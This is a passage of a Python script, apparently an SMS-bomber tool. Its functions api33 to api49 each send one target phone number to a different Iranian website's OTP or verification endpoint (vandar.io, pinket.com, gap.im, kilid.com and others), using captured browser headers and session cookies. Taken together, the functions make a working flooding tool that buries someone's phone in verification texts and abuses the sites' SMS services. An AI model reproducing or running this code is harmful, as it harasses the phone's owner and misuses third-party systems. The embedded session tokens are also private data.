        'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"',
        'accept': 'application/json, text/plain, */*',
        'sec-ch-ua-mobile': '?0',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.82 Safari/537.36',
        'sec-ch-ua-platform': '"Windows"',
        'origin': 'https://ghabzino.com',
        'sec-fetch-site': 'cross-site',
        'sec-fetch-mode': 'cors',
        'sec-fetch-dest': 'empty',
        'referer': 'https://ghabzino.com/',
        'accept-language': 'en-US,en;q=0.9',
    }

    json_data = {
        'Parameters': {
            'ApplicationType': 'Web',
            'ApplicationUniqueToken': None,
            'ApplicationVersion': '1.0.0',
            'MobileNumber': number,
        },
    }

    response = requests.post(
        'https://application2.billingsystem.ayantech.ir/WebServices/Core.svc/requestActivationCode', headers=headers,
        json=json_data)
    print(response.url)


def api33(number):
    headers = {
        'authority': 'api.vandar.io',
        'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"',
        'sec-ch-ua-mobile': '?0',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.82 Safari/537.36',
        # Already added when you pass json=
        # 'content-type': 'application/json',
        'access-control-allow-origin': '*',
        'accept': 'application/json',
        'x-requested-with': 'XMLHttpRequest',
        'access-control-allow-headers': 'Origin, X-Requested-With, Content-Type, Accept, Authorization, Access-Control-Allow-Origin',
        'x-csrftoken': 'example-of-custom-header',
        'withcredentials': 'false',
        'sec-ch-ua-platform': '"Windows"',
        'origin': 'https://dash.vandar.io',
        'sec-fetch-site': 'same-site',
        'sec-fetch-mode': 'cors',
        'sec-fetch-dest': 'empty',
        'referer': 'https://dash.vandar.io/',
        'accept-language': 'en-US,en;q=0.9',
    }

    json_data = {
        'mobile': number,
    }

    response = requests.post('https://api.vandar.io/v2/register/check/mobile', headers=headers, json=json_data)
    print(response.url)


def api34(number):
    cookies = {
        'rl_page_init_referrer': 'RudderEncrypt%3AU2FsdGVkX1%2FRr1HE0rbZJteg3UjRBvt5mup8eKe4OBw%3D',
        'rl_page_init_referring_domain': 'RudderEncrypt%3AU2FsdGVkX19ILH%2FuSELFM%2FuIpDA8thyBWX%2FZWjO2WBU%3D',
        'JSESSIONID': '313688588538E9F96A4E57E0553C5FBD',
        '_gcl_au': '1.1.1068681198.1648408894',
        '_anonymousUid': '1d0ef8a9-f002-4e95-b058-a90ea085bdbe',
        '_ga': 'GA1.2.619123619.1648408894',
        'rl_user_id': 'RudderEncrypt%3AU2FsdGVkX1%2B3Mn4Fo0pqOW0lPnasWnqUYPvR%2Bk1cvs8%3D',
        'rl_anonymous_id': 'RudderEncrypt%3AU2FsdGVkX1%2Bqxnv3rAME6r6YN63HVxhzHx%2BQJA%2FBxgKOBjiTKynWiCF9juw7E0Nf5vVe0uI4LWPT2At%2BfQdkGw%3D%3D',
        'rl_group_id': 'RudderEncrypt%3AU2FsdGVkX19tsi7AOaob14BojSsxonWApDWRLHCX2as%3D',
        'rl_trait': 'RudderEncrypt%3AU2FsdGVkX1%2B8N5epXKsYK72lSZx6TZcHvtZttjA1Htk%3D',
        'rl_group_trait': 'RudderEncrypt%3AU2FsdGVkX1%2Box6vdrzhFVXPzuvMxCWTkxDdjiFClEp0%3D',
        '_gid': 'GA1.2.1028961555.1648567907',
        '_gat_gtag_UA_140014518_1': '1',
    }

    headers = {
        'Connection': 'keep-alive',
        'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"',
        'X-Anonymous-Id': '58c6085a-2157-4ccb-8d10-8e69821ef4f3',
        'sec-ch-ua-mobile': '?0',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.82 Safari/537.36',
        'Content-Type': 'application/json;charset=UTF-8',
        'X-Anonymous-Uid': '1d0ef8a9-f002-4e95-b058-a90ea085bdbe',
        'X-Client': 'web',
        'sec-ch-ua-platform': '"Windows"',
        'Accept': '*/*',
        'Origin': 'https://pinket.com',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        'Referer': 'https://pinket.com/auth/phoneNumber',
        'Accept-Language': 'en-US,en;q=0.9',
        # Requests sorts cookies= alphabetically
        # 'Cookie': 'rl_page_init_referrer=RudderEncrypt%3AU2FsdGVkX1%2FRr1HE0rbZJteg3UjRBvt5mup8eKe4OBw%3D; rl_page_init_referring_domain=RudderEncrypt%3AU2FsdGVkX19ILH%2FuSELFM%2FuIpDA8thyBWX%2FZWjO2WBU%3D; JSESSIONID=313688588538E9F96A4E57E0553C5FBD; _gcl_au=1.1.1068681198.1648408894; _anonymousUid=1d0ef8a9-f002-4e95-b058-a90ea085bdbe; _ga=GA1.2.619123619.1648408894; rl_user_id=RudderEncrypt%3AU2FsdGVkX1%2B3Mn4Fo0pqOW0lPnasWnqUYPvR%2Bk1cvs8%3D; rl_anonymous_id=RudderEncrypt%3AU2FsdGVkX1%2Bqxnv3rAME6r6YN63HVxhzHx%2BQJA%2FBxgKOBjiTKynWiCF9juw7E0Nf5vVe0uI4LWPT2At%2BfQdkGw%3D%3D; rl_group_id=RudderEncrypt%3AU2FsdGVkX19tsi7AOaob14BojSsxonWApDWRLHCX2as%3D; rl_trait=RudderEncrypt%3AU2FsdGVkX1%2B8N5epXKsYK72lSZx6TZcHvtZttjA1Htk%3D; rl_group_trait=RudderEncrypt%3AU2FsdGVkX1%2Box6vdrzhFVXPzuvMxCWTkxDdjiFClEp0%3D; _gid=GA1.2.1028961555.1648567907; _gat_gtag_UA_140014518_1=1',
    }

    data = {"phoneNumber": number}

    response = requests.post('https://pinket.com/api/cu/v2/phone-verification', headers=headers, cookies=cookies,
                             json=data)
    print(response.url)


def api35(number):
    headers = {
        'authority': 'api.sibche.com',
        'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"',
        'device-type': 'browser',
        'os-version': '10',
        'sec-ch-ua-mobile': '?0',
        'app-version': '2fe27468aa3d0320cf0cc342d9a93e6115786ea2',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.82 Safari/537.36',
        'content-type': 'application/json;charset=UTF-8',
        'accept': 'application/json, text/plain, */*',
        'device-name': 'browser',
        'uuid': '714fe14b-0b53-4f36-a437-ade8ca8acd7e',
        'store': 'browser',
        'os': 'Windows',
        'sec-ch-ua-platform': '"Windows"',
        'origin': 'https://sibche.com',
        'sec-fetch-site': 'same-site',
        'sec-fetch-mode': 'cors',
        'sec-fetch-dest': 'empty',
        'referer': 'https://sibche.com/',
        'accept-language': 'en-US,en;q=0.9',
    }

    data = {"mobile": number}

    response = requests.post('https://api.sibche.com/profile/sendCode', headers=headers, json=data)


def api36(number):
    headers = {
        'authority': 'api.behtarino.com',
        'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"',
        'accept': 'application/json, text/plain, */*',
        'content-type': 'application/json;charset=UTF-8',
        'sec-ch-ua-mobile': '?0',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.82 Safari/537.36',
        'sec-ch-ua-platform': '"Windows"',
        'origin': 'https://ulgsupfxwa.vitrin.me',
        'sec-fetch-site': 'cross-site',
        'sec-fetch-mode': 'cors',
        'sec-fetch-dest': 'empty',
        'referer': 'https://ulgsupfxwa.vitrin.me/',
        'accept-language': 'en-US,en;q=0.9',
    }

    data = {"phone": number, "resend": None}

    response = requests.post('https://api.behtarino.com/api/v1/businesses/ulgsupfxwa/vitrin_verification/',
                             headers=headers, data=data)


def api37(number):
    cookies = {
        'analytics_campaign': '{%22source%22:%22direct%22%2C%22medium%22:null}',
        'analytics_token': '2a8dc68c-80bd-5cb0-5462-36acfdd75ba9',
        'analytics_session_token': '06005162-e694-3790-1ef8-bb062855561b',
        'yektanet_session_last_activity': '3/29/2022',
        '_yngt_iframe': '1',
        '_yngt': '31f33bf3-36005-5f720-06764-4d720f2d761ce',
        'Reserve': '1648568429660',
        'Cart': 'cart_1648568429670',
        'Time': '1648568429670',
        'saveCart': 'Off',
    }

    headers = {
        'authority': 'ahvazland.com',
        'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"',
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'x-requested-with': 'XMLHttpRequest',
        'sec-ch-ua-mobile': '?0',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.82 Safari/537.36',
        'sec-ch-ua-platform': '"Windows"',
        'origin': 'https://ahvazland.com',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-mode': 'cors',
        'sec-fetch-dest': 'empty',
        'referer': 'https://ahvazland.com/account',
        'accept-language': 'en-US,en;q=0.9',
        # Requests sorts cookies= alphabetically
        # 'cookie': 'analytics_campaign={%22source%22:%22direct%22%2C%22medium%22:null}; analytics_token=2a8dc68c-80bd-5cb0-5462-36acfdd75ba9; analytics_session_token=06005162-e694-3790-1ef8-bb062855561b; yektanet_session_last_activity=3/29/2022; _yngt_iframe=1; _yngt=31f33bf3-36005-5f720-06764-4d720f2d761ce; Reserve=1648568429660; Cart=cart_1648568429670; Time=1648568429670; saveCart=Off',
    }

    data = {
        'mobile': number,
        'jquery_load': '1',
    }
    response = requests.post('https://ahvazland.com/user/verification', headers=headers, cookies=cookies, data=data)


def api38(number):
    headers = {
        'authority': 'api.shabesh.com',
        'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"',
        'accept': 'application/json',
        'content-type': 'application/json; charset=utf-8',
        'sec-ch-ua-mobile': '?0',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.82 Safari/537.36',
        'sec-ch-ua-platform': '"Windows"',
        'origin': 'https://shabesh.com',
        'sec-fetch-site': 'same-site',
        'sec-fetch-mode': 'cors',
        'sec-fetch-dest': 'empty',
        'referer': 'https://shabesh.com/',
        'accept-language': 'en-US,en;q=0.9',
    }

    data = {"mobile": number}

    response = requests.post('https://api.shabesh.com/api/checknumber', headers=headers, json=data)


def api39(number):
    cookies = {
        'crisp-client%2Fsession%2F782f5102-b860-4523-a797-26b82d44cda8': 'session_6e6353c1-bc8b-45ea-9a70-3916f7cf4ff1',
    }

    headers = {
        'Connection': 'keep-alive',
        'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"',
        'Accept': '*/*',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With': 'XMLHttpRequest',
        'sec-ch-ua-mobile': '?0',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.82 Safari/537.36',
        'sec-ch-ua-platform': '"Windows"',
        'Origin': 'https://khoosheonline.ir',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        'Referer': 'https://khoosheonline.ir/%D8%B9%D8%B6%D9%88%DB%8C%D8%AA/',
        'Accept-Language': 'en-US,en;q=0.9',
        # 'Cookie': 'crisp-client%2Fsession%2F782f5102-b860-4523-a797-26b82d44cda8=session_6e6353c1-bc8b-45ea-9a70-3916f7cf4ff1',
    }

    data = {
        'action': 'send_sms_url_ud',
        'phone': number,
    }

    response = requests.post('https://khoosheonline.ir/wp-admin/admin-ajax.php', headers=headers, cookies=cookies,
                             data=data)


def api40(number):
    cookies = {
        '.Nop.Antiforgery': 'CfDJ8BGlemGL1sRNuV95c0PaQn4PQ5O5sSG2Mjqhynb9tzreGQBgjiwQAZqfn_zpP6n-nptPy5sIrl0qpNl5C-kWjaLLQLbhejMdHt8TaOZLXHo_2y4k2ORPWwu752i8QCEt3dVaikaN-neH17ZqesMrtMY',
        '.Nop.Customer': '7c9d9945-c51b-4cf7-80c4-668aa167b2e7',
    }

    headers = {
        'authority': 'o2market.ir',
        'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"',
        'sec-ch-ua-mobile': '?0',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.82 Safari/537.36',
        'sec-ch-ua-platform': '"Windows"',
        'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryn79DHAw4qYmcx48v',
        'accept': '*/*',
        'origin': 'https://o2market.ir',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-mode': 'cors',
        'sec-fetch-dest': 'empty',
        'referer': 'https://o2market.ir/Otp',
        'accept-language': 'en-US,en;q=0.9',
        # Requests sorts cookies= alphabetically
        # 'cookie': '.Nop.Antiforgery=CfDJ8BGlemGL1sRNuV95c0PaQn4PQ5O5sSG2Mjqhynb9tzreGQBgjiwQAZqfn_zpP6n-nptPy5sIrl0qpNl5C-kWjaLLQLbhejMdHt8TaOZLXHo_2y4k2ORPWwu752i8QCEt3dVaikaN-neH17ZqesMrtMY; .Nop.Customer=7c9d9945-c51b-4cf7-80c4-668aa167b2e7',
    }

    data = f'------WebKitFormBoundaryn79DHAw4qYmcx48v\r\nContent-Disposition: form-data; name="mobile"\r\n\r\n{number}\r\n------WebKitFormBoundaryn79DHAw4qYmcx48v\r\nContent-Disposition: form-data; name="ReturnUrl"\r\n\r\n\r\n------WebKitFormBoundaryn79DHAw4qYmcx48v\r\nContent-Disposition: form-data; name="__RequestVerificationToken"\r\n\r\nCfDJ8BGlemGL1sRNuV95c0PaQn439SyF48StwIUd6tESpRdSNZiwEZ3SZMCJKGP3HiAeJQh2O23vdT66xHftESDQ_550x_zxZUbvQqJcjUbAAQAb-HtHM37QXSDehW5I_1KWutQQQLAJMrVG6VeEAJLE6aA\r\n------WebKitFormBoundaryn79DHAw4qYmcx48v\r\nContent-Disposition: form-data; name="step"\r\n\r\n1\r\n------WebKitFormBoundaryn79DHAw4qYmcx48v--\r\n'

    response = requests.post('https://o2market.ir/Otp/ApiLoginFull', headers=headers, cookies=cookies, data=data)


def api41(number):
    cookies = {
        'PHPSESSID': '25b3112a6657b6be8a22307ba8c150ee',
        'analytics_campaign': '{%22source%22:%22direct%22%2C%22medium%22:null}',
        'analytics_token': '41562f24-c190-bcec-dcfd-0229ef2940d6',
        'analytics_session_token': 'a4cd3b51-968e-fa12-9acc-9e8571a529ef',
        'yektanet_session_last_activity': '3/29/2022',
        '_yngt_iframe': '1',
        '_ga_DQP0SDQDDZ': 'GS1.1.1648569041.1.0.1648569041.0',
        '_ga_DPS7CEXFPW': 'GS1.1.1648569041.1.0.1648569041.0',
        '_yngt': '31f33bf3-36005-5f720-06764-4d720f2d761ce',
        '_ga': 'GA1.2.1849809716.1648569041',
        '_gid': 'GA1.2.994141476.1648569042',
        '_gat_UA-213351030-1': '1',
        '_gat_gtag_UA_104149147_4': '1',
    }

    headers = {
        'Connection': 'keep-alive',
        'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"',
        'Accept': '*/*',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With': 'XMLHttpRequest',
        'sec-ch-ua-mobile': '?0',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.82 Safari/537.36',
        'sec-ch-ua-platform': '"Windows"',
        'Origin': 'https://measomarket.com',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        'Referer': 'https://measomarket.com/',
        'Accept-Language': 'en-US,en;q=0.9',
        # Requests sorts cookies= alphabetically
        # 'Cookie': 'PHPSESSID=25b3112a6657b6be8a22307ba8c150ee; analytics_campaign={%22source%22:%22direct%22%2C%22medium%22:null}; analytics_token=41562f24-c190-bcec-dcfd-0229ef2940d6; analytics_session_token=a4cd3b51-968e-fa12-9acc-9e8571a529ef; yektanet_session_last_activity=3/29/2022; _yngt_iframe=1; _ga_DQP0SDQDDZ=GS1.1.1648569041.1.0.1648569041.0; _ga_DPS7CEXFPW=GS1.1.1648569041.1.0.1648569041.0; _yngt=31f33bf3-36005-5f720-06764-4d720f2d761ce; _ga=GA1.2.1849809716.1648569041; _gid=GA1.2.994141476.1648569042; _gat_UA-213351030-1=1; _gat_gtag_UA_104149147_4=1',
    }

    data = {
        'loginMobile': number,
    }

    response = requests.post('https://measomarket.com/admin/functions/ajax-auth-login.php', headers=headers,
                             cookies=cookies, data=data)


def api42(number):
    headers = {
        'authority': 'core.gap.im',
        'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"',
        'x-version': '4.5.19',
        'accept-language': 'fa',
        'sec-ch-ua-mobile': '?0',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.82 Safari/537.36',
        'accept': 'application/json, text/plain, */*',
        'project': 'gap',
        'sec-ch-ua-platform': '"Windows"',
        'appversion': 'web',
        'origin': 'https://web.gap.im',
        'sec-fetch-site': 'same-site',
        'sec-fetch-mode': 'cors',
        'sec-fetch-dest': 'empty',
        'referer': 'https://web.gap.im/',
    }

    params = {
        'mobile': f'+98{number[1:]}',
    }

    response = requests.get('https://core.gap.im/v1/user/add.json', headers=headers, params=params)


def api43(number):
    headers = {
        'authority': 'admin.zoodex.ir',
        'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"',
        'vue': '1',
        'sec-ch-ua-mobile': '?0',
        'authorization': 'Bearer null',
        'content-type': 'application/json;charset=UTF-8',
        'accept': 'application/json',
        'device': '1',
        'client-id': 'mobit_web',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.82 Safari/537.36',
        'os': '3',
        'sec-ch-ua-platform': '"Windows"',
        'origin': 'https://zoodex.ir',
        'sec-fetch-site': 'same-site',
        'sec-fetch-mode': 'cors',
        'sec-fetch-dest': 'empty',
        'referer': 'https://zoodex.ir/',
        'accept-language': 'en-US,en;q=0.9',
    }

    data = {"mobile": number}

    response = requests.post('https://admin.zoodex.ir/api/v1/check-mobile', headers=headers, json=data)


def api44(number):
    headers = {
        'Connection': 'keep-alive',
        'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"',
        'LOCALE': 'FA',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.82 Safari/537.36',
        # Already added when you pass json=
        # 'Content-Type': 'application/json',
        'Accept': 'application/json, text/plain, */*',
        'sec-ch-ua-mobile': '?0',
        'COUNTRY_ID': '2',
        'sec-ch-ua-platform': '"Windows"',
        'Origin': 'https://kilid.com',
        'Sec-Fetch-Site': 'same-site',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        'Referer': 'https://kilid.com/',
        'Accept-Language': 'en-US,en;q=0.9',
    }

    params = {
        'realm': 'PORTAL',
    }

    json_data = {
        'mobile': number,
    }

    response = requests.post('https://server.kilid.com/global_auth_api/v1.0/authenticate/login/realm/otp/start',
                             headers=headers, params=params, json=json_data)


def api45(number):
    cookies = {
        'PHPSESSID': '33ge3stroa2cnj6q28a4ar08i9',
        '_gid': 'GA1.2.1905143675.1648569960',
        '_gat_UA-105359548-1': '1',
        '_ga_V8WNMKED86': 'GS1.1.1648569960.1.0.1648569960.0',
        '_ga': 'GA1.1.1023482234.1648569960',
    }

    headers = {
        'Connection': 'keep-alive',
        'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"',
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With': 'XMLHttpRequest',
        'sec-ch-ua-mobile': '?0',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.82 Safari/537.36',
        'sec-ch-ua-platform': '"Windows"',
        'Origin': 'https://www.markazeahan.com',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        'Referer': 'https://www.markazeahan.com/my-account/',
        'Accept-Language': 'en-US,en;q=0.9',
        # Requests sorts cookies= alphabetically
        # 'Cookie': 'PHPSESSID=33ge3stroa2cnj6q28a4ar08i9; _gid=GA1.2.1905143675.1648569960; _gat_UA-105359548-1=1; _ga_V8WNMKED86=GS1.1.1648569960.1.0.1648569960.0; _ga=GA1.1.1023482234.1648569960',
    }

    data = {
        'ep': number,
        'otp': '',
        'action': 'request_get_otp',
    }

    response = requests.post('https://www.markazeahan.com/wp-admin/admin-ajax.php', headers=headers, cookies=cookies,
                             data=data)


def api46(number):
    cookies = {
        'analytics_campaign': '{%22source%22:%22direct%22%2C%22medium%22:null}',
        'analytics_token': 'a8d32e4f-6f08-c61c-1a02-cfea519e615f',
        'analytics_session_token': 'd5b4c862-52b9-3c70-54d6-9d68d5456b56',
        'yektanet_session_last_activity': '3/29/2022',
        '_yngt_iframe': '1',
        'sib_cuid': 'd14e6831-d8d1-4b30-8a30-050fb0d929d0',
        '_ga': 'GA1.2.2136389016.1648570623',
        '_gid': 'GA1.2.1923408822.1648570623',
        '_gat_gtag_UA_123736353_1': '1',
        '_gat_UA-123736353-1': '1',
        '_yngt': '31f33bf3-36005-5f720-06764-4d720f2d761ce',
        '_60190d10aeeec174b6302f92': 'true',
        'popoup': 'true',
    }

    headers = {
        'authority': 'www.jeanswest.ir',
        'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"',
        'accept': '*/*',
        'content-type': 'application/x-www-form-urlencoded',
        'x-requested-with': 'XMLHttpRequest',
        'sec-ch-ua-mobile': '?0',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.82 Safari/537.36',
        'sec-ch-ua-platform': '"Windows"',
        'origin': 'https://www.jeanswest.ir',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-mode': 'cors',
        'sec-fetch-dest': 'empty',
        'referer': 'https://www.jeanswest.ir/%D8%AE%D8%B1%DB%8C%D8%AF-%D8%A7%D9%88%D9%84%DB%8C/',
        'accept-language': 'en-US,en;q=0.9',
        # Requests sorts cookies= alphabetically
        # 'cookie': 'analytics_campaign={%22source%22:%22direct%22%2C%22medium%22:null}; analytics_token=a8d32e4f-6f08-c61c-1a02-cfea519e615f; analytics_session_token=d5b4c862-52b9-3c70-54d6-9d68d5456b56; yektanet_session_last_activity=3/29/2022; _yngt_iframe=1; sib_cuid=d14e6831-d8d1-4b30-8a30-050fb0d929d0; _ga=GA1.2.2136389016.1648570623; _gid=GA1.2.1923408822.1648570623; _gat_gtag_UA_123736353_1=1; _gat_UA-123736353-1=1; _yngt=31f33bf3-36005-5f720-06764-4d720f2d761ce; _60190d10aeeec174b6302f92=true; popoup=true',
    }

    params = {
        'api': 'register',
    }

    data = {
        'mobile': number,
    }

    response = requests.post('https://www.jeanswest.ir/first-order-api/', headers=headers, params=params,
                             cookies=cookies, data=data)


def api47(number):
    cookies = {
        '_gid': 'GA1.2.1807893839.1648570705',
        '_gat_UA-144175006-1': '1',
        '__asc': 'a90f885617fd678a6b100b695a6',
        '__auc': 'a90f885617fd678a6b100b695a6',
        '_ga_SS4L1K9M54': 'GS1.1.1648570704.1.1.1648570709.0',
        '_ga': 'GA1.2.1506308706.1648570705',
    }

    headers = {
        'authority': 'karpishe.com',
        'content-length': '0',
        'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"',
        'accept': 'application/json, text/plain, */*',
        'x-utm': '{"kp_url":"https://karpishe.com/login"}',
        'sec-ch-ua-mobile': '?0',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.82 Safari/537.36',
        'x-kp-guestid': '4f1a2caa-229b-4e34-ac8c-258b8bb0be69',
        'sec-ch-ua-platform': '"Windows"',
        'origin': 'https://karpishe.com',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-mode': 'cors',
        'sec-fetch-dest': 'empty',
        'referer': 'https://karpishe.com/login',
        'accept-language': 'en-US,en;q=0.9',
        # Requests sorts cookies= alphabetically
        # 'cookie': '_gid=GA1.2.1807893839.1648570705; _gat_UA-144175006-1=1; __asc=a90f885617fd678a6b100b695a6; __auc=a90f885617fd678a6b100b695a6; _ga_SS4L1K9M54=GS1.1.1648570704.1.1.1648570709.0; _ga=GA1.2.1506308706.1648570705',
    }

    params = {
        'otp': 'true',
    }

    response = requests.post(f'https://karpishe.com/api/auth/authenticate/{number}', headers=headers, params=params,
                             cookies=cookies)


def api48(number):
    cookies = {
        'myzel': 's%3A_YCErOT0rtfbcuOjUWbqSSL43sLGLYQk.rZggCLOnFSH7YjmolLylkyvLnSKLIxkt8mtsfy1QeLk',
        'io': 'sgU_HLtxRXRUG6JaAGHu',
        '_gid': 'GA1.2.405097496.1648570870',
        '_gat_UA-221448445-1': '1',
        '_ga': 'GA1.1.1782891286.1648570870',
        '_ga_YEL6FL8NQ3': 'GS1.1.1648570869.1.0.1648570870.59',
    }

    headers = {
        'authority': 'myzel.ir',
        'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"',
        'pragma': 'no-cache',
        'x-is-app': 'false',
        'x-app-version': '0',
        'x-client-version': '0.5.82',
        'sec-ch-ua-mobile': '?0',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.82 Safari/537.36',
        'content-type': 'application/json;charset=UTF-8',
        'accept': 'application/json, text/plain, */*',
        'sec-ch-ua-platform': '"Windows"',
        'origin': 'https://myzel.ir',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-mode': 'cors',
        'sec-fetch-dest': 'empty',
        'referer': 'https://myzel.ir/app/login',
        'accept-language': 'en-US,en;q=0.9',
        # Requests sorts cookies= alphabetically
        # 'cookie': 'myzel=s%3A_YCErOT0rtfbcuOjUWbqSSL43sLGLYQk.rZggCLOnFSH7YjmolLylkyvLnSKLIxkt8mtsfy1QeLk; io=sgU_HLtxRXRUG6JaAGHu; _gid=GA1.2.405097496.1648570870; _gat_UA-221448445-1=1; _ga=GA1.1.1782891286.1648570870; _ga_YEL6FL8NQ3=GS1.1.1648570869.1.0.1648570870.59',
    }

    data = {"cell": number}

    response = requests.post('https://myzel.ir/auth/login', headers=headers, cookies=cookies, json=data)


def api49(number):
    cookies = {
        'XSRF-TOKEN': 'eyJpdiI6Iis5aGRIb2NiaFI4Ykp0Q1laQ05hRUE9PSIsInZhbHVlIjoiaXhTZWtHUVwvNWNTMDVZSVVHZWpqa1wvY3hPdmZTUHllUlkwY2d1SlVLSUhLSjBVWkhwbHkyTjMybHJiTGRRc09DIiwibWFjIjoiYTliMzE1ZjMyNjExYzdmMzZjMWI5MmQwYjljMmYzZWMxOTVjM2Q4OTVmMTc1ZWRjZWJiOGNhZmFiOTQ0ZWE4YiJ9',
        'laravel_session': 'eyJpdiI6IlM0a1M4RkRSQUVLZExVWTdzdWZcL3Z3PT0iLCJ2YWx1ZSI6Ikc4bUxxQndZYjFtYnVURDdWZEx5YmRidk03NlwvUTcybXlBTCt4dGJGc2RSeDNWU3IzUDhGYUU2QmREWG9wZ3ZHIiwibWFjIjoiZjYxYzIwYjllNTllMTllMDJjOTY2NjA1Y2YyMDdjZDYxZTRkMTE0ZmI0YTk3ODMwYWNlMmY1NjhkZTU5YzcyOSJ9',
    }

    headers = {
        'Connection': 'keep-alive',
        'Accept': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.82 Safari/537.36',
        # Already added when you pass json=
        # 'Content-Type': 'application/json',
        'Origin': 'http://anif.ir',
        'Referer': 'http://anif.ir/login',
        'Accept-Language': 'en-US,en;q=0.9',
        # Requests sorts cookies= alphabetically
